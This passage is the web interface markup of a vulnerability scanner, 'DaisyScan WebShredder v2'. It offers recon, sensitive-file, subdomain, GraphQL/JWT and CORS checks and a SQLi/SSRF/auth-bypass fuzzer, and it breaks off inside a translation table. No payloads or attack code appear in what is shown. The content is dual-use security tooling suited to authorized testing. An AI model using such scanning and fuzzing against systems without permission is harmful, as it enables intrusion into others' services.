.val-box{background:var(--bg3);border:1px solid var(--bdr);border-radius:8px;padding:10px 14px;margin-top:10px;font-size:.74rem;display:none}
.val-box.ok{border-color:rgba(52,211,153,.3);color:var(--gr);display:flex;align-items:center;gap:7px}
.val-box.err{border-color:rgba(248,113,113,.3);color:var(--rd);display:flex;align-items:center;gap:7px}

.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
@media(max-width:700px){.g2,.g3{grid-template-columns:1fr}}

.stat-card{background:var(--bg3);border:1px solid var(--bdr);border-radius:8px;padding:12px;text-align:center}
.stat-num{font-family:var(--fd);font-size:1.6rem;font-weight:800;color:var(--pl)}
.stat-label{font-size:.62rem;color:var(--td);letter-spacing:.1em;text-transform:uppercase;margin-top:2px}

.cors-row{padding:10px 0;border-bottom:1px solid rgba(139,92,246,.07)}
.cors-row:last-child{border-bottom:none}
.cors-head{display:flex;gap:7px;align-items:center;flex-wrap:wrap;margin-bottom:5px}
.cors-detail{display:flex;flex-wrap:wrap;gap:12px;font-size:.69rem;color:var(--td)}

.progress-wrap{margin-top:10px;display:none}
.progress-wrap.show{display:block}
.progress-text{font-size:.67rem;color:var(--td);margin-bottom:4px}

footer{position:relative;z-index:5;text-align:center;padding:18px;border-top:1px solid var(--bdr);color:var(--td);font-size:.63rem;letter-spacing:.1em}
footer a{color:var(--pl);text-decoration:none}
footer a:hover{text-decoration:underline}

.copy-btn{background:none;border:1px solid var(--bdr);border-radius:4px;color:var(--td);font-family:var(--fm);font-size:.6rem;padding:2px 7px;cursor:pointer;transition:all .18s}
.copy-btn:hover{border-color:var(--p);color:var(--pl)}

@media(max-width:480px){
  header{padding:10px 14px}
  .logo-name{font-size:1.1rem}
  main{padding:14px 12px}
  .hero{padding:18px 0 14px}
  .hero-title{font-size:1.6rem}
  .soc-link span{display:none}
  .card{padding:14px}
  .tabs{padding:3px;gap:1px}
  .tab-btn{padding:6px 10px;font-size:.62rem}
}
</style>
</head>
<body>
<header>
  <div class="logo-area">
    <svg class="daisy-logo" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
      <g transform="translate(30,30)">
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#c4b5fd" opacity=".9"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#a78bfa" opacity=".85" transform="rotate(45)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#c4b5fd" opacity=".9" transform="rotate(90)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#a78bfa" opacity=".85" transform="rotate(135)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#c4b5fd" opacity=".9" transform="rotate(180)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#a78bfa" opacity=".85" transform="rotate(225)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#c4b5fd" opacity=".9" transform="rotate(270)"/>
        <ellipse cx="0" cy="-17" rx="5" ry="11.5" fill="#a78bfa" opacity=".85" transform="rotate(315)"/>
        <circle r="9" fill="#fbbf24"/>
        <circle r="6" fill="#f59e0b"/>
        <circle r="3" fill="#d97706"/>
      </g>
    </svg>
    <div>
      <div class="logo-name">DaisyScan</div>
      <div class="logo-sub" data-i18n="ls">WebShredder v2</div>
    </div>
  </div>
  <div class="header-right">
    <div class="lang-sw">
      <button class="lang-btn active" onclick="setLang('en')">EN</button>
      <button class="lang-btn" onclick="setLang('id')">ID</button>
      <button class="lang-btn" onclick="setLang('ru')">RU</button>
    </div>
    <div class="socials">
      <a href="https://github.com/KaisarYetiandi" target="_blank" class="soc-link">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
        <span>GitHub</span>
      </a>
      <a href="https://t.me/Darkness_Lock" target="_blank" class="soc-link">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
        <span>Telegram</span>
      </a>
    </div>
  </div>
</header>

<main>
  <div class="hero">
    <div class="hero-text">
      <h1 class="hero-title" data-i18n="heroT">WebShredder</h1>
      <p class="hero-sub" data-i18n="heroS">Deep Web &amp; API Vulnerability Scanner · Bug Hunter · Security Research</p>
    </div>
    <div class="hero-animate">
      <div class="cat-wrap">
        <svg viewBox="0 0 120 155" width="110" height="143" xmlns="http://www.w3.org/2000/svg">
          <!-- Tail -->
          <path class="cat-tail-path" d="M72,118 Q100,100 94,76 Q88,56 80,58" stroke="#efefef" stroke-width="9" fill="none" stroke-linecap="round"/>
          <!-- Shadow -->
          <ellipse cx="52" cy="148" rx="26" ry="5" fill="rgba(0,0,0,.3)"/>
          <!-- Body -->
          <g class="cat-body">
            <ellipse cx="52" cy="118" rx="30" ry="27" fill="#f5f5f8"/>
            <!-- Body tummy -->
            <ellipse cx="52" cy="122" rx="16" ry="14" fill="#fce4ec"/>
            <!-- Neck -->
            <ellipse cx="52" cy="93" rx="13" ry="7" fill="#f5f5f8"/>
            <!-- Head -->
            <circle cx="52" cy="72" r="26" fill="#f5f5f8"/>
            <!-- Left ear -->
            <polygon points="30,52 22,28 44,46" fill="#f0f0f0"/>
            <polygon points="31,50 25,32 41,45" fill="#ffb3c6"/>
            <!-- Right ear -->
            <polygon points="74,52 82,28 60,46" fill="#f0f0f0"/>
            <polygon points="73,50 79,32 63,45" fill="#ffb3c6"/>
            <!-- Purple bow -->
            <g transform="translate(52,54)">
              <ellipse cx="-9" cy="0" rx="8" ry="5.5" fill="#7c3aed" transform="rotate(-18)"/>
              <ellipse cx="9" cy="0" rx="8" ry="5.5" fill="#7c3aed" transform="rotate(18)"/>
              <circle cx="0" cy="0" r="4.5" fill="#c4b5fd"/>
              <circle cx="0" cy="0" r="2" fill="#7c3aed"/>
            </g>
            <!-- Left eye white -->
            <ellipse cx="38" cy="68" rx="7.5" ry="8" fill="#dbeafe"/>
            <!-- Right eye white -->
            <ellipse cx="66" cy="68" rx="7.5" ry="8" fill="#dbeafe"/>
            <!-- Left iris -->
            <ellipse class="eye-l" cx="38" cy="69" rx="5.5" ry="6" fill="#38bdf8"/>
            <!-- Right iris -->
            <ellipse class="eye-r" cx="66" cy="69" rx="5.5" ry="6" fill="#38bdf8"/>
            <!-- Left pupil -->
            <ellipse cx="38" cy="70" rx="3" ry="4" fill="#0f172a"/>
            <!-- Right pupil -->
            <ellipse cx="66" cy="70" rx="3" ry="4" fill="#0f172a"/>
            <!-- Eye shine L -->
            <circle cx="40" cy="67" r="1.6" fill="white"/>
            <circle cx="36" cy="72" r=".9" fill="white" opacity=".6"/>
            <!-- Eye shine R -->
            <circle cx="68" cy="67" r="1.6" fill="white"/>
            <circle cx="64" cy="72" r=".9" fill="white" opacity=".6"/>
            <!-- Eyelashes left top -->
            <line x1="31" y1="62" x2="28" y2="57" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="35" y1="60" x2="34" y2="55" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="39" y1="59" x2="39" y2="54" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="43" y1="60" x2="45" y2="55" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="46" y1="62" x2="49" y2="58" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <!-- Eyelashes right top -->
            <line x1="59" y1="62" x2="56" y2="57" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="63" y1="60" x2="62" y2="55" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="67" y1="59" x2="67" y2="54" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="71" y1="60" x2="73" y2="55" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <line x1="74" y1="62" x2="77" y2="58" stroke="#2d2d3a" stroke-width="1.1" stroke-linecap="round"/>
            <!-- Nose -->
            <path d="M50,79 Q52,77 54,79 Q56,81.5 52,84 Q48,81.5 50,79" fill="#ffb3c6"/>
            <!-- Mouth -->
            <path d="M49,84 Q52,88 55,84" stroke="#9d8cbe" stroke-width="1.2" fill="none" stroke-linecap="round"/>
            <!-- Cheek blush -->
            <ellipse cx="30" cy="75" rx="6" ry="4" fill="#ffcdd2" opacity=".45"/>
            <ellipse cx="74" cy="75" rx="6" ry="4" fill="#ffcdd2" opacity=".45"/>
            <!-- Whiskers left -->
            <line x1="14" y1="76" x2="44" y2="79" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <line x1="14" y1="80" x2="44" y2="81" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <line x1="16" y1="84" x2="44" y2="84" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <!-- Whiskers right -->
            <line x1="90" y1="76" x2="60" y2="79" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <line x1="90" y1="80" x2="60" y2="81" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <line x1="88" y1="84" x2="60" y2="84" stroke="#bbbbc8" stroke-width=".9" stroke-linecap="round"/>
            <!-- Front paws -->
            <ellipse cx="36" cy="140" rx="12" ry="9" fill="#f0f0f3"/>
            <ellipse cx="62" cy="140" rx="12" ry="9" fill="#f0f0f3"/>
            <!-- Paw pads -->
            <ellipse cx="36" cy="142" rx="6" ry="4" fill="#ffcdd2"/>
            <ellipse cx="62" cy="142" rx="6" ry="4" fill="#ffcdd2"/>
            <!-- Paw toes L -->
            <ellipse cx="30" cy="140" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
            <ellipse cx="36" cy="139" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
            <ellipse cx="42" cy="140" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
            <!-- Paw toes R -->
            <ellipse cx="56" cy="140" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
            <ellipse cx="62" cy="139" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
            <ellipse cx="68" cy="140" rx="2.5" ry="2" fill="#ffb3c6" opacity=".7"/>
          </g>
        </svg>
      </div>
      <div class="cat-daisy-wrap">
        <svg class="mini-daisy" viewBox="0 0 44 44" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
          <g transform="translate(22,22)">
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#c4b5fd" opacity=".9"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#a78bfa" opacity=".85" transform="rotate(45)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#c4b5fd" opacity=".9" transform="rotate(90)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#a78bfa" opacity=".85" transform="rotate(135)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#c4b5fd" opacity=".9" transform="rotate(180)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#a78bfa" opacity=".85" transform="rotate(225)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#c4b5fd" opacity=".9" transform="rotate(270)"/>
            <ellipse cx="0" cy="-11" rx="3.5" ry="8" fill="#a78bfa" opacity=".85" transform="rotate(315)"/>
            <circle r="6" fill="#fbbf24"/>
            <circle r="3.8" fill="#f59e0b"/>
          </g>
        </svg>
        <svg viewBox="0 0 30 40" width="22" height="30">
          <path d="M15,38 Q15,20 15,10" stroke="#4ade80" stroke-width="2.5" fill="none" stroke-linecap="round"/>
          <path d="M15,28 Q8,22 6,16" stroke="#4ade80" stroke-width="1.8" fill="none" stroke-linecap="round"/>
          <path d="M15,24 Q22,18 24,12" stroke="#4ade80" stroke-width="1.8" fill="none" stroke-linecap="round"/>
        </svg>
      </div>
    </div>
  </div>

  <div class="tabs-outer">
    <div class="tabs" id="mainTabs">
      <button class="tab-btn active" onclick="sw('recon')">🔍 <span data-i18n="tRecon">Recon</span></button>
      <button class="tab-btn" onclick="sw('files')">📁 <span data-i18n="tFiles">Sensitive Files</span></button>
      <button class="tab-btn" onclick="sw('endpoints')">🛣️ <span data-i18n="tEP">Endpoints</span></button>
      <button class="tab-btn" onclick="sw('subdomains')">🌐 <span data-i18n="tSub">Subdomains</span></button>
      <button class="tab-btn" onclick="sw('graphql')">⬡ GraphQL / JWT</button>
      <button class="tab-btn" onclick="sw('cors')">🔗 CORS</button>
      <button class="tab-btn" onclick="sw('fuzzer')">💉 <span data-i18n="tFuzz">Fuzzer</span></button>
      <button class="tab-btn" onclick="sw('about')">🌸 <span data-i18n="tAbout">About</span></button>
    </div>
  </div>

  <!-- RECON -->
  <div class="tab-panel active" id="tab-recon">
    <div class="card">
      <div class="card-title">🔍 <span data-i18n="reconT">Reconnaissance Engine</span></div>
      <div class="form-row">
        <div class="inp-grp">
          <label class="inp-label" data-i18n="targetUrl">Target URL</label>
          <input type="text" id="recon-url" placeholder="https://target.com" oninput="clearVal('recon-val')">
        </div>
      </div>
      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
        <button class="btn" id="recon-btn" onclick="runRecon()"><span class="spin" id="recon-spin"></span><span data-i18n="scan">Start Scan</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('recon-url','recon-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="recon-val"></div>
      <div class="status-line" id="recon-st"></div>
      <div class="scan-bar" id="recon-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="recon-out"></div>
  </div>

  <!-- SENSITIVE FILES -->
  <div class="tab-panel" id="tab-files">
    <div class="card">
      <div class="card-title">📁 <span data-i18n="filesT">Sensitive File Scanner</span></div>
      <div class="inp-grp">
        <label class="inp-label" data-i18n="targetUrl">Target URL</label>
        <input type="text" id="files-url" placeholder="https://target.com" oninput="clearVal('files-val')">
      </div>
      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
        <button class="btn" id="files-btn" onclick="runFiles()"><span class="spin" id="files-spin"></span><span data-i18n="scan">Start Scan</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('files-url','files-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="files-val"></div>
      <div class="status-line" id="files-st"></div>
      <div class="scan-bar" id="files-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="files-out"></div>
  </div>

  <!-- ENDPOINTS -->
  <div class="tab-panel" id="tab-endpoints">
    <div class="card">
      <div class="card-title">🛣️ <span data-i18n="epT">Endpoint &amp; API Discovery</span></div>
      <div class="inp-grp">
        <label class="inp-label" data-i18n="targetUrl">Target URL</label>
        <input type="text" id="endpoints-url" placeholder="https://target.com" oninput="clearVal('ep-val')">
      </div>
      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
        <button class="btn" id="endpoints-btn" onclick="runEndpoints()"><span class="spin" id="endpoints-spin"></span><span data-i18n="scan">Start Scan</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('endpoints-url','ep-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="ep-val"></div>
      <div class="status-line" id="endpoints-st"></div>
      <div class="scan-bar" id="endpoints-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="endpoints-out"></div>
  </div>

  <!-- SUBDOMAINS -->
  <div class="tab-panel" id="tab-subdomains">
    <div class="card">
      <div class="card-title">🌐 <span data-i18n="subT">Subdomain Discovery</span></div>
      <p style="font-size:.73rem;color:var(--td);margin-bottom:12px" data-i18n="subDesc">DNS-validated scanning — only live, HTTP-responding subdomains are shown. Dead domains are automatically excluded.</p>
      <div class="inp-grp">
        <label class="inp-label" data-i18n="targetUrl">Target URL</label>
        <input type="text" id="sub-url" placeholder="https://target.com" oninput="clearVal('sub-val')">
      </div>
      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
        <button class="btn" id="sub-btn" onclick="runSub()"><span class="spin" id="sub-spin"></span><span data-i18n="scan">Start Scan</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('sub-url','sub-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="sub-val"></div>
      <div class="status-line" id="sub-st"></div>
      <div class="scan-bar" id="sub-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="sub-out"></div>
  </div>

  <!-- GRAPHQL / JWT -->
  <div class="tab-panel" id="tab-graphql">
    <div class="card">
      <div class="card-title">⬡ GraphQL Analyzer</div>
      <div class="inp-grp">
        <label class="inp-label">GraphQL Endpoint URL</label>
        <input type="text" id="gql-url" placeholder="https://target.com/graphql">
      </div>
      <div style="display:flex;gap:8px;margin-top:10px">
        <button class="btn" id="gql-btn" onclick="runGQL()"><span class="spin" id="gql-spin"></span><span data-i18n="analyze">Analyze</span></button>
      </div>
      <div class="status-line" id="gql-st"></div>
      <div class="scan-bar" id="gql-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="gql-out"></div>

    <div class="card" style="margin-top:0">
      <div class="card-title">🔐 JWT Analyzer</div>
      <div class="inp-grp">
        <label class="inp-label">JWT Token</label>
        <textarea id="jwt-tok" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF..."></textarea>
      </div>
      <div style="display:flex;gap:8px;margin-top:10px">
        <button class="btn" id="jwt-btn" onclick="runJWT()"><span class="spin" id="jwt-spin"></span><span data-i18n="analyze">Analyze</span></button>
      </div>
    </div>
    <div id="jwt-out"></div>
  </div>

  <!-- CORS -->
  <div class="tab-panel" id="tab-cors">
    <div class="card">
      <div class="card-title">🔗 CORS Tester</div>
      <div class="inp-grp">
        <label class="inp-label" data-i18n="targetUrl">Target URL (API endpoint)</label>
        <input type="text" id="cors-url" placeholder="https://target.com/api/data">
      </div>
      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
        <button class="btn" id="cors-btn" onclick="runCORS()"><span class="spin" id="cors-spin"></span><span data-i18n="scan">Start Scan</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('cors-url','cors-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="cors-val"></div>
      <div class="status-line" id="cors-st"></div>
      <div class="scan-bar" id="cors-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="cors-out"></div>
  </div>

  <!-- FUZZER -->
  <div class="tab-panel" id="tab-fuzzer">
    <div class="card">
      <div class="card-title">💉 <span data-i18n="fuzzT">Fuzzer — SQLi / SSRF / Auth Bypass</span></div>
      <div class="form-row-2">
        <div class="inp-grp">
          <label class="inp-label" data-i18n="targetUrl">Target URL</label>
          <input type="text" id="fuzz-url" placeholder="https://target.com/api/user">
        </div>
        <div class="inp-grp">
          <label class="inp-label" data-i18n="fType">Fuzz Type</label>
          <select id="fuzz-type" onchange="updateFuzzUI()">
            <option value="sqli">SQL Injection</option>
            <option value="ssrf">SSRF Testing</option>
            <option value="auth_bypass">Auth Bypass</option>
          </select>
        </div>
      </div>
      <div id="sqli-extra" style="margin-top:10px">
        <div class="inp-grp">
          <label class="inp-label" data-i18n="paramN">Parameter Name</label>
          <input type="text" id="fuzz-param" value="id" placeholder="id">
        </div>
      </div>
      <div id="ssrf-extra" style="margin-top:10px;display:none">
        <div class="inp-grp">
          <label class="inp-label">SSRF Parameter Name</label>
          <input type="text" id="fuzz-ssrf-param" value="url" placeholder="url">
        </div>
      </div>
      <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
        <button class="btn" id="fuzz-btn" onclick="runFuzzer()"><span class="spin" id="fuzz-spin"></span><span data-i18n="startFuzz">Start Fuzzing</span></button>
        <button class="btn btn-sec btn-sm" onclick="valUrl('fuzz-url','fuzz-val')" data-i18n="validate">Validate URL</button>
      </div>
      <div class="val-box" id="fuzz-val"></div>
      <div class="status-line" id="fuzz-st"></div>
      <div class="scan-bar" id="fuzz-bar"><div class="scan-bar-fill"></div></div>
    </div>
    <div id="fuzz-out"></div>
  </div>

  <!-- ABOUT -->
  <div class="tab-panel" id="tab-about">
    <div class="card">
      <div class="about-grid">
        <div class="avatar-box">🌸</div>
        <div>
          <div class="about-name">KaisarYetiandi</div>
          <div class="about-role" data-i18n="aboutRole">Independent Security Researcher · Autodidact</div>
          <p class="about-bio" data-i18n="aboutBio">Self-taught security researcher specializing in malware analysis, reverse engineering, vulnerability research, and bug hunting. Deeply passionate about uncovering hidden threats through systematic independent analysis — no formal degree, just raw dedication, curiosity, and years of hands-on experience breaking and understanding systems from the ground up.</p>
          <div class="skill-tags">
            <span class="stag">Malware Analysis</span><span class="stag">Reverse Engineering</span>
            <span class="stag">Bug Hunting</span><span class="stag">Web Pentesting</span>
            <span class="stag">API Security</span><span class="stag">Exploit Dev</span>
            <span class="stag">OSINT</span><span class="stag">Threat Intel</span>
            <span class="stag">CTF Player</span><span class="stag">Autodidact</span>
            <span class="stag">Python</span><span class="stag">Assembly</span>
          </div>
          <div class="social-btns">
            <a href="https://github.com/KaisarYetiandi" target="_blank" class="btn btn-sm">⬡ github.com/KaisarYetiandi</a>
            <a href="https://t.me/Darkness_Lock" target="_blank" class="btn btn-sm">✈ t.me/Darkness_Lock</a>
          </div>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-title" data-i18n="aboutToolT">About DaisyScan v2</div>
      <p style="font-size:.77rem;line-height:1.9;color:var(--tx)" data-i18n="aboutToolD">DaisyScan WebShredder v2 is a professional-grade web &amp; API vulnerability scanner with deep scanning capabilities. Features: multi-threaded Recon Engine with WAF/tech detection, Smart Sensitive File Scanner with content validation &amp; false-positive prevention, Endpoint &amp; API Discovery with soft-404 detection, Live Subdomain Discovery with DNS &amp; HTTP validation, GraphQL Introspection Analyzer, JWT Security Analyzer with attack vector generation, CORS Misconfiguration Tester with exploitability verification, and a multi-mode Fuzzer (SQLi, SSRF, Auth Bypass) with confirmed-only results.</p>
    </div>
  </div>
</main>

<footer>
  <p>DaisyScan v2 &mdash; <span data-i18n="fBy">by</span> <a href="https://github.com/KaisarYetiandi" target="_blank">KaisarYetiandi</a> &mdash; <a href="https://t.me/Darkness_Lock" target="_blank">t.me/Darkness_Lock</a></p>
  <p style="margin-top:4px;font-size:.58rem" data-i18n="fNote">For authorized penetration testing only. Use responsibly and ethically.</p>
</footer>

<script>
const I18N={
en:{
  ls:'WebShredder v1',heroT:'DaisyScan',heroS:'Deep Web & API Vulnerability Scanner · Bug Hunter · Security Research',
  tRecon:'Recon',tFiles:'Sensitive Files',tEP:'Endpoints',tSub:'Subdomains',tFuzz:'Fuzzer',tAbout:'About',
  reconT:'Reconnaissance Engine',filesT:'Sensitive File Scanner',epT:'Endpoint & API Discovery',
  subT:'Subdomain Discovery',fuzzT:'Fuzzer — SQLi / SSRF / Auth Bypass',
  targetUrl:'Target URL',fType:'Fuzz Type',paramN:'Parameter Name',
  scan:'Start Scan',startFuzz:'Start Fuzzing',analyze:'Analyze',validate:'Validate URL',
  scanning:'Scanning...',done:'Scan complete',err:'Error',
  subDesc:'DNS-validated scanning — only live, HTTP-responding subdomains are shown. Dead domains are automatically excluded.',
  aboutRole:'Independent Security Researcher · Autodidact',
  aboutBio:'Self-taught security researcher specializing in malware analysis, reverse engineering, vulnerability research, and bug hunting. Deeply passionate about uncovering hidden threats through systematic independent analysis — no formal degree, just raw dedication, curiosity, and years of hands-on experience breaking and understanding systems from the ground up.',
  aboutToolT:'About DaisyScan v2',
  aboutToolD:'DaisyScan tools is a professional-grade web & API vulnerability scanner with deep scanning capabilities. Features: multi-threaded Recon Engine, Smart Sensitive File Scanner with content validation & false-positive prevention, Endpoint Discovery with soft-404 detection, Live Subdomain Discovery with DNS & HTTP validation, GraphQL Introspection, JWT Security Analyzer, CORS Tester, and multi-mode Fuzzer.',
  fBy:'by',fNote:'For authorized penetration testing only. Use responsibly and ethically.',
  noVuln:'No confirmed vulnerabilities found',noSub:'No live subdomains found',
  found:'found',checked:'checked',confirmed:'Confirmed',suspicious:'Suspicious',forbidden:'Forbidden',
},
id:{
  ls:'WebShredder v1',heroT:'DaisyScan',heroS:'Pemindai Kerentanan Web & API Mendalam · Bug Hunter · Riset Keamanan',
  tRecon:'Rekon',tFiles:'File Sensitif',tEP:'Endpoint',tSub:'Subdomain',tFuzz:'Fuzzer',tAbout:'Tentang',
  reconT:'Mesin Pengintaian',filesT:'Pemindai File Sensitif',epT:'Penemuan Endpoint & API',
  subT:'Penemuan Subdomain',fuzzT:'Fuzzer — SQLi / SSRF / Bypass Auth',
  targetUrl:'URL Target',fType:'Jenis Fuzzing',paramN:'Nama Parameter',
  scan:'Mulai Pindai',startFuzz:'Mulai Fuzzing',analyze:'Analisis',validate:'Validasi URL',
  scanning:'Memindai...',done:'Pemindaian selesai',err:'Kesalahan',
  subDesc:'Pemindaian tervalidasi DNS — hanya subdomain yang aktif dan merespons HTTP yang ditampilkan. Domain mati otomatis diabaikan.',
  aboutRole:'Peneliti Keamanan Independen · Otodidak',
  aboutBio:'Peneliti keamanan otodidak yang ahli dalam analisis malware, reverse engineering, riset kerentanan, dan bug hunting. Bersemangat mengungkap ancaman tersembunyi melalui analisis mandiri yang sistematis — tanpa gelar formal, hanya dedikasi penuh, rasa ingin tahu, dan pengalaman langsung bertahun-tahun dalam memahami bagaimana sistem dapat dibobol.',
  aboutToolT:'Tentang DaisyScan v2',
  aboutToolD:'DaisyScan adalah alat pemindai kerentanan web & API berkelas profesional dengan kemampuan pemindaian mendalam. Fitur: Mesin Rekon multi-thread, Pemindai File Sensitif cerdas dengan validasi konten & pencegahan false positive, Penemuan Endpoint dengan deteksi soft-404, Penemuan Subdomain Aktif dengan validasi DNS & HTTP, Analisis GraphQL, Analisis Keamanan JWT, Uji CORS, dan Fuzzer multi-mode.',
  fBy:'oleh',fNote:'Hanya untuk pengujian keamanan yang sah. Gunakan dengan bertanggung jawab.',
  noVuln:'Tidak ada kerentanan terkonfirmasi',noSub:'Tidak ada subdomain aktif ditemukan',
  found:'ditemukan',checked:'diperiksa',confirmed:'Terkonfirmasi',suspicious:'Mencurigakan',forbidden:'Terlarang',
},
ru:{
  ls:'WebShredder v1',heroT:'DaisyScan',heroS:'Глубокий сканер Web & API · Охотник за багами · Исследование безопасности',
  tRecon:'Разведка',tFiles:'Файлы',tEP:'Эндпоинты',tSub:'Поддомены',tFuzz:'Фаззер',tAbout:'О нас',
  reconT:'Движок разведки',filesT:'Сканер чувствительных файлов',epT:'Обнаружение эндпоинтов & API',
  subT:'Обнаружение поддоменов',fuzzT:'Фаззер — SQLi / SSRF / Обход авторизации',
  targetUrl:'URL цели',fType:'Тип фаззинга',paramN:'Имя параметра',
  scan:'Начать сканирование',startFuzz:'Начать фаззинг',analyze:'Анализировать',validate:'Проверить URL',
  scanning:'Сканирование...',done:'Сканирование завершено',err:'Ошибка',
  subDesc:'Сканирование с DNS-валидацией — отображаются только живые поддомены с HTTP-ответом. Недоступные домены автоматически исключаются.',
  aboutRole:'Независимый исследователь безопасности · Самоучка',
  aboutBio:'Исследователь безопасности-самоучка, специализирующийся на анализе вредоносного ПО, обратной разработке, исследовании уязвимостей и охоте за багами. Страстно увлечён выявлением скрытых угроз через методичный самостоятельный анализ — без диплома, только самоотдача, любопытство и многолетний практический опыт.',
  aboutToolT:'О DaisyScan v2',
  aboutToolD:'DaisyScan профессиональный сканер уязвимостей web & API с возможностями глубокого сканирования. Функции: многопоточный Recon Engine, умный сканер чувствительных файлов с валидацией контента и предотвращением ложных срабатываний, обнаружение эндпоинтов с детектором soft-404, обнаружение живых поддоменов с DNS & HTTP валидацией, анализ GraphQL, JWT, CORS и многорежимный фаззер.',
  fBy:'от',fNote:'Только для авторизованного тестирования. Используйте ответственно и этично.',
  noVuln:'Подтверждённых уязвимостей не обнаружено',noSub:'Живых поддоменов не найдено',
